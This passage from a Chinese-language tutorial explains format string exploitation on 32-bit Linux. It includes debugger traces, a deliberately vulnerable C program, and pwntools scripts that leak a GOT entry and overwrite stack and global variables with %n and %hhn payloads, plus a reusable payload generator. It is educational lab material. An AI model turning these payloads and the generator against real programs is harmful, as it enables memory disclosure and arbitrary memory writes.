<p>可以看出，我们的程序崩溃了，为什么呢？这是因为我们试图将该格式化字符串所对应的值作为地址进行解析，但是显然该值没有办法作为一个合法的地址被解析，所以程序就崩溃了。具体的可以参考下面的调试。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$eax   : 0xffffd440  →  &quot;%4$s&quot;</span><br><span class="line">$ebx   : 0x0</span><br><span class="line">$ecx   : 0x7fffffe0</span><br><span class="line">$edx   : 0xf7fb6870  →  0x00000000</span><br><span class="line">$esp   : 0xffffd42c  →  0x080484ce  →  &lt;main+99&gt; add esp, 0x10</span><br><span class="line">$ebp   : 0xffffd4b8  →  0x00000000</span><br><span class="line">$esi   : 0xf7fb5000  →  0x001afdb0</span><br><span class="line">$edi   : 0xf7fb5000  →  0x001afdb0</span><br><span class="line">$eip   : 0xf7e4e030  →  &lt;printf+0&gt; call 0xf7f22369</span><br><span class="line">$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffffd42c│+0x0000: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10	 ← $esp</span><br><span class="line">0xffffd430│+0x0004: 0xffffd440  →  &quot;%4$s&quot;</span><br><span class="line">0xffffd434│+0x0008: 0xffffd440  →  &quot;%4$s&quot;</span><br><span class="line">0xffffd438│+0x000c: 0x000000c2</span><br><span class="line">0xffffd43c│+0x0010: 0xf7e949db  →   add esp, 0x10</span><br><span class="line">0xffffd440│+0x0014: &quot;%4$s&quot;</span><br><span class="line">0xffffd444│+0x0018: 0xffffd500  →  0x00000000</span><br><span class="line">0xffffd448│+0x001c: 0x000000e0</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">   0xf7e4e027 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]</span><br><span class="line">   0xf7e4e02d                  nop</span><br><span class="line">   0xf7e4e02e                  xchg   ax, ax</span><br><span class="line"> → 0xf7e4e030 &lt;printf+0&gt;       call   0xf7f22369</span><br><span class="line">   ↳  0xf7f22369                  mov    eax, DWORD PTR [esp]</span><br><span class="line">      0xf7f2236c                  ret</span><br><span class="line">      0xf7f2236d                  mov    edx, DWORD PTR [esp]</span><br><span class="line">      0xf7f22370                  ret</span><br><span class="line">      0xf7f22371                  mov    esi, DWORD PTR [esp]</span><br><span class="line">      0xf7f22374                  ret</span><br><span class="line">──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────</span><br><span class="line">0xf7f22369 (</span><br><span class="line">   [sp + 0x0] &#x3D; 0x080484ce → &lt;main+99&gt; add esp, 0x10,</span><br><span class="line">   [sp + 0x4] &#x3D; 0xffffd440 → &quot;%4$s&quot;,</span><br><span class="line">   [sp + 0x8] &#x3D; 0xffffd440 → &quot;%4$s&quot;</span><br><span class="line">)</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;leakmemory&quot;, stopped 0xf7e4e030 in printf (), reason: BREAKPOINT</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0xf7e4e030 → printf()</span><br><span class="line">[#1] 0x80484ce → main()</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  help x&#x2F;</span><br><span class="line">Examine memory: x&#x2F;FMT ADDRESS.</span><br><span class="line">ADDRESS is an expression for the memory address to examine.</span><br><span class="line">FMT is a repeat count followed by a format letter and a size letter.</span><br><span class="line">Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal),</span><br><span class="line">  t(binary), f(float), a(address), i(instruction), c(char), s(string)</span><br><span class="line">  and z(hex, zero padded on the left).</span><br><span class="line">Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).</span><br><span class="line">The specified number of objects of the specified size are printed</span><br><span class="line">according to the format.</span><br><span class="line"></span><br><span class="line">Defaults for format and size letters are those previously used.</span><br><span class="line">Default count is 1.  Default address is following last thing printed</span><br><span class="line">with this command or &quot;print&quot;.</span><br><span class="line">gef➤  x&#x2F;x 0xffffd440</span><br><span class="line">0xffffd440:	0x73243425</span><br><span class="line">gef➤  vmmap</span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start      End        Offset     Perm Path</span><br><span class="line">0x08048000 0x08049000 0x00000000 r-x &#x2F;home&#x2F;oldthree&#x2F;Desktop&#x2F;leakmemory</span><br><span class="line">0x08049000 0x0804a000 0x00000000 r-- &#x2F;home&#x2F;oldthree&#x2F;Desktop&#x2F;leakmemory</span><br><span class="line">0x0804a000 0x0804b000 0x00001000 rw- &#x2F;home&#x2F;oldthree&#x2F;Desktop&#x2F;leakmemory</span><br><span class="line">0x0804b000 0x0806c000 0x00000000 rw- [heap]</span><br><span class="line">0xf7e04000 0xf7e05000 0x00000000 rw-</span><br><span class="line">0xf7e05000 0xf7fb2000 0x00000000 r-x &#x2F;lib32&#x2F;libc-2.23.so</span><br><span class="line">0xf7fb2000 0xf7fb3000 0x001ad000 --- &#x2F;lib32&#x2F;libc-2.23.so</span><br><span class="line">0xf7fb3000 0xf7fb5000 0x001ad000 r-- &#x2F;lib32&#x2F;libc-2.23.so</span><br><span class="line">0xf7fb5000 0xf7fb6000 0x001af000 rw- &#x2F;lib32&#x2F;libc-2.23.so</span><br><span class="line">0xf7fb6000 0xf7fb9000 0x00000000 rw-</span><br><span class="line">0xf7fd3000 0xf7fd4000 0x00000000 rw-</span><br><span class="line">0xf7fd4000 0xf7fd7000 0x00000000 r-- [vvar]</span><br><span class="line">0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]</span><br><span class="line">0xf7fd9000 0xf7ffc000 0x00000000 r-x &#x2F;lib32&#x2F;ld-2.23.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 0x00022000 r-- &#x2F;lib32&#x2F;ld-2.23.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 0x00023000 rw- &#x2F;lib32&#x2F;ld-2.23.so</span><br><span class="line">0xfffdd000 0xffffe000 0x00000000 rw- [stack]</span><br><span class="line">gef➤  x&#x2F;x 0x73243425</span><br><span class="line">0x73243425:	Cannot access memory at address 0x73243425</span><br></pre></td></tr></table></figure>

<p>显然 0xffffcd20 处所对应的格式化字符串所对应的变量值 0x73243425 并不能够被改程序访问，所以程序就自然崩溃了。</p>
<p>那么如果我们设置一个可访问的地址呢？比如说 scanf@got，结果会怎么样呢？应该自然是输出 scanf 对应的地址了。我们不妨来试一下。</p>
<p>首先，获取 scanf@got 的地址，如下</p>
<blockquote>
<p>这里之所以没有使用 printf 函数，是因为 scanf 函数会对 0a，0b，0c，00 等字符有一些奇怪的处理，，导致无法正常读入，，感兴趣的可以试试。。。。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  got</span><br><span class="line"></span><br><span class="line">GOT protection: Partial RelRO | GOT functions: 3</span><br><span class="line"></span><br><span class="line">[0x804a00c] printf@GLIBC_2.0  →  0xf7e4e030</span><br><span class="line">[0x804a010] __libc_start_main@GLIBC_2.0  →  0xf7e1d550</span><br><span class="line">[0x804a014] __isoc99_scanf@GLIBC_2.7  →  0xf7e605c0</span><br></pre></td></tr></table></figure>

<p>下面我们利用 pwntools 构造 payload 如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;leakmemory&#39;)</span><br><span class="line">leakmemory &#x3D; ELF(&#39;.&#x2F;leakmemory&#39;)</span><br><span class="line">__isoc99_scanf_got &#x3D; leakmemory.got[&#39;__isoc99_scanf&#39;]</span><br><span class="line">print hex(__isoc99_scanf_got)</span><br><span class="line">payload &#x3D; p32(__isoc99_scanf_got) + &#39;%4$s&#39;</span><br><span class="line">print payload</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(&#39;%4$s\n&#39;)</span><br><span class="line">print hex(u32(sh.recv()[4:8])) # remove the first bytes of __isoc99_scanf@got</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>其中，我们使用 gdb.attach(sh) 来进行调试。当我们运行到第二个 printf 函数的时候 (记得下断点)，可以看到我们的第四个参数确实指向我们的 scanf 的地址，这里输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> → 0xf7615670 &lt;printf+0&gt;       call   0xf76ebb09 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   ↳  0xf76ebb09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]</span><br><span class="line">      0xf76ebb0c &lt;__x86.get_pc_thunk.ax+3&gt; ret</span><br><span class="line">      0xf76ebb0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]</span><br><span class="line">      0xf76ebb10 &lt;__x86.get_pc_thunk.dx+3&gt; ret</span><br><span class="line">───────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">[&#39;0xffbbf8dc&#39;, &#39;l8&#39;]</span><br><span class="line">8</span><br><span class="line">0xffbbf8dc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10     ← $esp</span><br><span class="line">0xffbbf8e0│+0x04: 0xffbbf8f0  →  0x0804a014  →  0xf76280c0  →  &lt;__isoc99_scanf+0&gt; push ebp</span><br><span class="line">0xffbbf8e4│+0x08: 0xffbbf8f0  →  0x0804a014  →  0xf76280c0  →  &lt;__isoc99_scanf+0&gt; push ebp</span><br><span class="line">0xffbbf8e8│+0x0c: 0x000000c2</span><br><span class="line">0xffbbf8ec│+0x10: 0xf765c6bb  →  &lt;handle_intel+107&gt; add esp, 0x10</span><br><span class="line">0xffbbf8f0│+0x14: 0x0804a014  →  0xf76280c0  →  &lt;__isoc99_scanf+0&gt; push ebp  ← $eax</span><br><span class="line">0xffbbf8f4│+0x18: &quot;%4$s&quot;</span><br><span class="line">0xffbbf8f8│+0x1c: 0x00000000</span><br></pre></td></tr></table></figure>

<p>同时，在我们运行的 terminal 下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python leakmemory.py </span><br><span class="line">[+] Starting local process &#39;.&#x2F;leakmemory&#39;: pid 15368</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;oldthree&#x2F;Desktop&#x2F;leakmemory&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">0x804a014</span><br><span class="line">\x14\x04%4$s</span><br><span class="line">[*] running in new terminal: &#x2F;usr&#x2F;bin&#x2F;gdb -q  &quot;.&#x2F;leakmemory&quot; 15368</span><br><span class="line">[-] Waiting for debugger: debugger exited! (maybe check &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;yama&#x2F;ptrace_scope)</span><br><span class="line">0xf7df85c0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process &#39;.&#x2F;leakmemory&#39; stopped with exit code 0 (pid 15368)</span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>

<p>我们确实得到了 scanf 的地址。</p>
<p>但是，并不是说所有的偏移机器字长的整数倍，可以让我们直接相应参数来获取，有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字长整数倍的地址处，一般来说，类似于下面的这个样子。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[padding][addr]</span><br></pre></td></tr></table></figure>

<p>注意</p>
<blockquote>
<p>我们不能直接在命令行输入 \ x0c\xa0\x04\x08%4$s 这是因为虽然前面的确实是 printf@got 的地址，但是，scanf 函数并不会将其识别为对应的字符串，而是会将 ,x,0,c 分别作为一个字符进行读入。下面就是错误的例子。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10   ← $esp</span><br><span class="line">0xffffcd00│+0x04: 0xffffcd10  →  &quot;\x0c\xa0\x04\x08%4$s&quot;</span><br><span class="line">0xffffcd04│+0x08: 0xffffcd10  →  &quot;\x0c\xa0\x04\x08%4$s&quot;</span><br><span class="line">0xffffcd08│+0x0c: 0x000000c2</span><br><span class="line">0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10</span><br><span class="line">0xffffcd10│+0x14: &quot;\x0c\xa0\x04\x08%4$s&quot;   ← $eax</span><br><span class="line">0xffffcd14│+0x18: &quot;\xa0\x04\x08%4$s&quot;</span><br><span class="line">0xffffcd18│+0x1c: &quot;\x04\x08%4$s&quot;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────</span><br><span class="line">[#0] 0xf7e44670 → Name: __printf(format&#x3D;0xffffcd10 &quot;\\x0c\\xa0\\x04\\x08%4$s&quot;)</span><br><span class="line">[#1] 0x80484ce → Name: main()</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  x&#x2F;x 0xffffcd10</span><br><span class="line">0xffffcd10:   0x6330785c</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h2><p>上面，我们已经展示了如何利用格式化字符串来泄露栈内存以及任意地址内存，那么我们有没有可能修改栈上变量的值呢，甚至修改任意地址变量的内存呢? 答案是可行的，只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值。这里我们可以想一下格式化字符串中的类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</span><br></pre></td></tr></table></figure>

<p>通过这个类型参数，再加上一些小技巧，我们就可以达到我们的目的，这里仍然分为两部分，一部分为覆盖栈上的变量，第二部分为覆盖指定地址的变量。</p>
<p>这里我们给出如下的程序来介绍相应的部分。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* example&#x2F;overflow&#x2F;overflow.c *&#x2F;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int a &#x3D; 123, b &#x3D; 456;</span><br><span class="line">int main() &#123;</span><br><span class="line">  int c &#x3D; 789;</span><br><span class="line">  char s[100];</span><br><span class="line">  printf(&quot;%p\n&quot;, &amp;c);</span><br><span class="line">  scanf(&quot;%s&quot;, s);</span><br><span class="line">  printf(s);</span><br><span class="line">  if (c &#x3D;&#x3D; 16) &#123;</span><br><span class="line">    puts(&quot;modified c.&quot;);</span><br><span class="line">  &#125; else if (a &#x3D;&#x3D; 2) &#123;</span><br><span class="line">    puts(&quot;modified a for a small number.&quot;);</span><br><span class="line">  &#125; else if (b &#x3D;&#x3D; 0x12345678) &#123;</span><br><span class="line">    puts(&quot;modified b for a big number!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>makefile 在对应的文件夹中。而无论是覆盖哪个地址的变量，我们基本上都是构造类似如下的 payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...[overwrite addr]....%[overwrite offset]$n</span><br></pre></td></tr></table></figure>

<p>其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。所以一般来说，也是如下步骤</p>
<ul>
<li>确定覆盖地址</li>
<li>确定相对偏移</li>
<li>进行覆盖</li>
</ul>
<h2 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h2><h3 id="确定覆盖地址"><a href="#确定覆盖地址" class="headerlink" title="确定覆盖地址"></a>确定覆盖地址</h3><p>首先，我们自然是来想办法知道栈变量 c 的地址。由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。</p>
<h3 id="确定相对偏移"><a href="#确定相对偏移" class="headerlink" title="确定相对偏移"></a>确定相对偏移</h3><p>其次，我们来确定一下存储格式化字符串的地址是 printf 将要输出的第几个参数 ()。 这里我们通过之前的泄露栈变量数值的方法来进行操作。通过调试</p>
<p>其次，我们来确定一下存储格式化字符串的地址是 printf 将要输出的第几个参数 ()。 这里我们通过之前的泄露栈变量数值的方法来进行操作。通过调试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]</span><br><span class="line">      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret</span><br><span class="line">      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]</span><br><span class="line">      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">[&#39;0xffffcd0c&#39;, &#39;l8&#39;]</span><br><span class="line">8</span><br><span class="line">0xffffcd0c│+0x00: 0x080484d7  →  &lt;main+76&gt; add esp, 0x10     ← $esp</span><br><span class="line">0xffffcd10│+0x04: 0xffffcd28  →  &quot;%d%d&quot;</span><br><span class="line">0xffffcd14│+0x08: 0xffffcd8c  →  0x00000315</span><br><span class="line">0xffffcd18│+0x0c: 0x000000c2</span><br><span class="line">0xffffcd1c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10</span><br><span class="line">0xffffcd20│+0x14: 0xffffcd4e  →  0xffff0000  →  0x00000000</span><br><span class="line">0xffffcd24│+0x18: 0xffffce4c  →  0xffffd07a  →  &quot;XDG_SEAT_PATH&#x3D;&#x2F;org&#x2F;freedesktop&#x2F;DisplayManager&#x2F;Seat[...]&quot;</span><br><span class="line">0xffffcd28│+0x1c: &quot;%d%d&quot;     ← $eax</span><br></pre></td></tr></table></figure>

<p>我们可以发现在 0xffffcd14 处存储着变量 c 的数值。继而，我们再确定格式化字符串’%d%d’的地址 0xffffcd28 相对于 printf 函数的格式化字符串参数 0xffffcd10 的偏移为 0x18，即格式化字符串相当于 printf 函数的第 7 个参数，相当于格式化字符串的第 6 个参数。</p>
<h3 id="进行覆盖"><a href="#进行覆盖" class="headerlink" title="进行覆盖"></a>进行覆盖</h3><p>这样，第 6 个参数处的值就是存储变量 c 的地址，我们便可以利用 %n 的特征来修改 c 的值。payload 如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[addr of c]%012d%6$n</span><br></pre></td></tr></table></figure>

<p>addr of c 的长度为 4，故而我们得再输入 12 个字符才可以达到 16 个字符，以便于来修改 c 的值为 16。</p>
<p>具体脚本如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def forc():</span><br><span class="line">    sh &#x3D; process(&#39;.&#x2F;overwrite&#39;)</span><br><span class="line">    c_addr &#x3D; int(sh.recvuntil(&#39;\n&#39;, drop&#x3D;True), 16)</span><br><span class="line">    print hex(c_addr)</span><br><span class="line">    payload &#x3D; p32(c_addr) + &#39;%012d&#39; + &#39;%6$n&#39;</span><br><span class="line">    print payload</span><br><span class="line">    #gdb.attach(sh)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    print sh.recv()</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">forc()</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➜  overwrite git:(master) ✗ python exploit.py</span><br><span class="line">[+] Starting local process &#39;.&#x2F;overwrite&#39;: pid 74806</span><br><span class="line">0xfffd8cdc</span><br><span class="line">܌��%012d%6$n</span><br><span class="line">܌��-00000160648modified c.</span><br></pre></td></tr></table></figure>

<h2 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h2><h3 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h3><p>首先，我们来考虑一下如何修改 data 段的变量为一个较小的数字，比如说，<strong>小于机器字长的数字</strong>。这里以 2 为例。可能会觉得这其实没有什么区别，可仔细一想，真的没有么？如果我们还是将要覆盖的地址放在最前面，那么将直接占用机器字长个 (4 或 8) 字节。显然，无论之后如何输出，都只会比 4 大。</p>
<blockquote>
<p>或许我们可以使用整形溢出来修改对应的地址的值，但是这样将面临着我们得一次输出大量的内容。而这，一般情况下，基本都不会攻击成功。</p>
</blockquote>
<p>那么我们应该怎么做呢？再仔细想一下，我们有必要将所要覆盖的变量的地址放在字符串的最前面么？似乎没有，我们当时只是为了寻找偏移，所以才把 tag 放在字符串的最前面，如果我们把 tag 放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。前面已经说了我们的格式化字符串的为第 6 个参数。由于我们想要把 2 写到对应的地址处，故而格式化字符串的前面的字节必须是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aa%k$nxx</span><br></pre></td></tr></table></figure>

<p>此时对应的存储的格式化字符串已经占据了 6 个字符的位置，如果我们再添加两个字符 aa，那么其实 aa%k 就是第 6 个参数，$nxx 其实就是第 7 个参数，后面我们如果跟上我们要覆盖的地址，那就是第 8 个参数，所以如果我们这里设置 k 为 8，其实就可以覆盖了。</p>
<p>利用 ida 可以得到 a 的地址为 0x0804A024（由于 a、b 是已初始化的全局变量，因此不在堆栈中）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.data:0804A024                 public a</span><br><span class="line">.data:0804A024 a               dd 7Bh</span><br></pre></td></tr></table></figure>

<p>故而我们可以构造如下的利用代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def fora():</span><br><span class="line">    sh &#x3D; process(&#39;.&#x2F;overwrite&#39;)</span><br><span class="line">    a_addr &#x3D; 0x0804A024</span><br><span class="line">    payload &#x3D; &#39;aa%8$naa&#39; + p32(a_addr)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    print sh.recv()</span><br><span class="line">    sh.interactive()</span><br></pre></td></tr></table></figure>

<p>对应的结果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➜  overwrite git:(master) ✗ python exploit.py</span><br><span class="line">[+] Starting local process &#39;.&#x2F;overwrite&#39;: pid 76508</span><br><span class="line">[*] Process &#39;.&#x2F;overwrite&#39; stopped with exit code 0 (pid 76508)</span><br><span class="line">0xffc1729c</span><br><span class="line">aaaa$\xa0\x0modified a for a small number.</span><br></pre></td></tr></table></figure>

<p>其实，这里我们需要掌握的小技巧就是，我们没有必要必须把地址放在最前面，放在那里都可以，只要我们可以找到其对应的偏移即可。</p>
<h3 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h3><p>上面介绍了覆盖小数字，这里我们就少覆盖大数字了。上面我们也说了，我们可以选择直接一次性输出大数字个字节来进行覆盖，但是这样基本也不会成功，因为太长了。而且即使成功，我们一次性等待的时间也太长了，那么有没有什么比较好的方式呢？自然是有了。</p>
<p>不过在介绍之前，我们得先再简单了解一下，变量在内存中的存储格式。首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12。再者，我们可以回忆一下格式化字符串里面的标志，可以发现有这么两个标志：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数。</span><br><span class="line">h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数。</span><br></pre></td></tr></table></figure>

<p>所以说，我们可以利用 %hhn 向某个地址写入单字节，利用 %hn 向某个地址写入双字节。这里，我们以单字节为例。</p>
<p>首先，我们还是要确定的是要覆盖的地址为多少，利用 ida 看一下，可以发现地址为 0x0804A028。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.data:0804A028                 public b</span><br><span class="line">.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510r</span><br></pre></td></tr></table></figure>

<p>即我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x0804A028 \x78</span><br><span class="line">0x0804A029 \x56</span><br><span class="line">0x0804A02a \x34</span><br><span class="line">0x0804A02b \x12</span><br></pre></td></tr></table></figure>

<p>首先，由于我们的字符串的偏移为 6，所以我们可以确定我们的 payload 基本是这个样子的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+&#39;%6$n&#39;+pad2+&#39;%7$n&#39;+pad3+&#39;%8$n&#39;+pad4+&#39;%9$n&#39;</span><br></pre></td></tr></table></figure>

<p>我们可以依次进行计算。这里给出一个基本的构造，如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def fmt(prev, word, index):</span><br><span class="line">    if prev &lt; word:</span><br><span class="line">        result &#x3D; word - prev</span><br><span class="line">        fmtstr &#x3D; &quot;%&quot; + str(result) + &quot;c&quot;</span><br><span class="line">    elif prev &#x3D;&#x3D; word:</span><br><span class="line">        result &#x3D; 0</span><br><span class="line">    else:</span><br><span class="line">        result &#x3D; 256 + word - prev</span><br><span class="line">        fmtstr &#x3D; &quot;%&quot; + str(result) + &quot;c&quot;</span><br><span class="line">    fmtstr +&#x3D; &quot;%&quot; + str(index) + &quot;$hhn&quot;</span><br><span class="line">    return fmtstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fmt_str(offset, size, addr, target):</span><br><span class="line">    payload &#x3D; &quot;&quot;</span><br><span class="line">    for i in range(4):</span><br><span class="line">        if size &#x3D;&#x3D; 4:</span><br><span class="line">            payload +&#x3D; p32(addr + i)</span><br><span class="line">        else:</span><br><span class="line">            payload +&#x3D; p64(addr + i)</span><br><span class="line">    prev &#x3D; len(payload)</span><br><span class="line">    for i in range(4):</span><br><span class="line">        payload +&#x3D; fmt(prev, (target &gt;&gt; i * 8) &amp; 0xff, offset + i)</span><br><span class="line">        prev &#x3D; (target &gt;&gt; i * 8) &amp; 0xff</span><br><span class="line">    return payload</span><br><span class="line">payload &#x3D; fmt_str(6,4,0x0804A028,0x12345678)</span><br></pre></td></tr></table></figure>



<p>其中每个参数的含义基本如下</p>
<ul>
<li>offset 表示要覆盖的地址最初的偏移</li>
<li>size 表示机器字长</li>
<li>addr 表示将要覆盖的地址。</li>
<li>target 表示我们要覆盖为的目的变量值。</li>
</ul>
<p>相应的 exploit 如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def forb():</span><br><span class="line">    sh &#x3D; process(&#39;.&#x2F;overwrite&#39;)</span><br><span class="line">    payload &#x3D; fmt_str(6, 4, 0x0804A028, 0x12345678)</span><br><span class="line">    print payload</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    print sh.recv()</span><br><span class="line">    sh.interactive()</span><br></pre></td></tr></table></figure>

<p>结果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➜  overwrite git:(master) ✗ python exploit.py</span><br><span class="line">[+] Starting local process &#39;.&#x2F;overwrite&#39;: pid 78547</span><br><span class="line">(\xa0\x0)\xa0\x0*\xa0\x0+\xa0\x0%104c%6$hhn%222c%7$hhn%222c%8$hhn%222c%9$hhn</span><br><span class="line">[*] Process &#39;.&#x2F;overwrite&#39; stopped with exit code 0 (pid 78547)</span><br><span class="line">0xfff6f9bc</span><br><span class="line">(\xa0\x0)\xa0\x0*\xa0\x0+\xa0\x0  </span><br></pre></td></tr></table></figure>

<p>当然，我们也可以利用 %n 分别对每个地址进行写入，也可以得到对应的答案，但是由于我们写入的变量都只会影响由其开始的四个字节，所以最后一个变量写完之后，我们可能会修改之后的三个字节，如果这三个字节比较重要的话，程序就有可能因此崩溃。而采用 %hhn 则不会有这样的问题，因为这样只会修改相应地址的一个字节。</p>
<h1 id="格式化字符串漏洞例子"><a href="#格式化字符串漏洞例子" class="headerlink" title="格式化字符串漏洞例子"></a>格式化字符串漏洞例子</h1><p>下面会介绍一些 CTF 中的格式化漏洞的题目。也都是格式化字符串常见的利用。</p>
<h2 id="64-位程序格式化字符串漏洞"><a href="#64-位程序格式化字符串漏洞" class="headerlink" title="64 位程序格式化字符串漏洞"></a>64 位程序格式化字符串漏洞</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote>
<p>其实 64 位的偏移计算和 32 位类似，都是算对应的参数。只不过 64 位函数的前 6 个参数是存储在相应的寄存器中的。那么在格式化字符串漏洞中呢？虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。</p>
</blockquote>
